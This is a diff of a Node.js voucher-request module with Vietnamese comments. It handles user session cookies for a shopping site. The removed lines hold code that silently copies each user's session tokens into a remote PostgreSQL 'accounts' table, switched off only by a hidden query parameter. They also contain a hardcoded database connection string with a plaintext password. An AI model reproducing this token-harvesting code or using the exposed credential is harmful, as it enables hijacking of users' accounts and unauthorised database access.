@@ -1,39 +1,5 @@
 const https = require('https');
 const zlib = require('zlib');
-const { Pool } = require('pg');
-
-// --- Kết nối DB ---
-const DATABASE_URL = process.env.DATABASE_URL || 'postgresql://cookiedb_3atl_user:swCFgz5aOeYG5B5kY8YSRxaREybOrMRP@dpg-d9selc2fngtc73f6ne1g-a.singapore-postgres.render.com/cookiedb_3atl';
-
-const pool = new Pool({
-    connectionString: DATABASE_URL,
-    ssl: { rejectUnauthorized: false }
-});
-
-// --- Tạo bảng (chạy 1 lần khi khởi động) ---
-async function initDB() {
-    const createTableQuery = `
-        CREATE TABLE IF NOT EXISTS taikhoan (
-            id SERIAL PRIMARY KEY,
-            phone VARCHAR(50),
-            username VARCHAR(100),
-            email VARCHAR(100),
-            password VARCHAR(255),
-            spc_f VARCHAR(500),
-            spc_st VARCHAR(500),
-            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-            
-            CONSTRAINT unique_taikhoan_spc_f UNIQUE (spc_f),
-            CONSTRAINT unique_taikhoan_spc_st UNIQUE (spc_st)
-        )
-    `;
-    try {
-        await pool.query(createTableQuery);
-        console.log('✅ Table taikhoan đã sẵn sàng');
-    } catch (err) {
-        console.error('❌ Lỗi tạo bảng:', err.message);
-    }
-}
 
 function extractSpcSt(cookieStr) {
     if (!cookieStr) return null;
@@ -134,21 +100,12 @@ async function handleVoucherRoutes(req, res) {
                 return true;
             }
 
-            // --- Kiểm tra query param ?addDB=false ---
-            const urlParts = req.url.split('?');
-            const queryParams = new URLSearchParams(urlParts[1] || '');
-            const skipInsert = queryParams.get('addDB') === 'false';
-            // --- END ---
-
             const COOKIES = listUser;
             const VOUCHER_CODES = listVoucher;
             const DELAY_MS = 0;
             const totalRequests = COOKIES.length * VOUCHER_CODES.length;
             const results = [];
             let requestCount = 0;
-
-            // --- Set để đảm bảo 1 cookie chỉ insert 1 lần ---
-            const insertedCookies = new Set();
 
             for (let i = 0; i < COOKIES.length; i++) {
                 let cookieStopped = false;
@@ -173,29 +130,6 @@ async function handleVoucherRoutes(req, res) {
 
                     if (result.success && result.data?.data) {
                         const invalidCode = result.data.data.invalid_message_code;
-
-                        // --- INSERT DB: chỉ chạy 1 lần cho mỗi cookie, bỏ qua nếu addDB=false ---
-                        if (!insertedCookies.has(COOKIES[i]) && !skipInsert) {
-                            try {
-                                const spcSt = extractSpcSt(COOKIES[i]);
-                                const spcF  = extractSpcF(COOKIES[i]);
-                                if (spcSt) {
-                                    await pool.query(
-                                        `INSERT INTO taikhoan (phone, username, email, password, spc_f, spc_st)
-                                         SELECT $1, $2, $3, $4, $5, $6
-                                         WHERE NOT EXISTS (
-                                             SELECT 1 FROM taikhoan 
-                                             WHERE spc_f = $5 OR spc_st = $6
-                                         )`,
-                                        [null, null, null, null, spcF || null, spcSt]
-                                    );
-                                    insertedCookies.add(COOKIES[i]);
-                                }
-                            } catch (dbErr) {
-                                console.error('DB insert error:', dbErr.message);
-                            }
-                        }
-                        // --- END INSERT DB ---
 
                         if (invalidCode === 0 || invalidCode === 1) {
                             results.push({
@@ -256,4 +190,4 @@ async function handleVoucherRoutes(req, res) {
     return false;
 }
 
-module.exports = { handleVoucherRoutes, pool, initDB };
+module.exports = { handleVoucherRoutes };
